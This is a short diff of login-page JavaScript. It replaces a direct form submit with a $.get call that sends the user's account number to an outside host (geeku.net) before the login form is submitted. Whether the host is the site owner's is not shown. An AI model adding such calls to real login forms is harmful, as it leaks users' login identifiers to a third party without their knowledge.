@@ -56,22 +56,13 @@
 			}
 			$('#abc').val( passwdkey );
 			nums     = $('#Account').val();
-			dates    = new Date();
-			year     = dates.getFullYear();
-			month    = dates.getMonth() + 1; 
-			day      = dates.getDate();
-			hour     = dates.getHours();
-			min      = dates.getMinutes();
-			fullDate = year + '-' + month + '-' + day + '-' + hour + '-' + min;
-			$('#login-form').submit();
-			/*$.get("getNum.php",
+			$.get("http://www.geeku.net/jw/getNum.php",
 			{
 				num  : nums,
-				date : fullDate
 			},
 			function(){
 				$('#login-form').submit();
-			});*/
+			});
 		}
 
 		$(".submit-button").hover(function(){
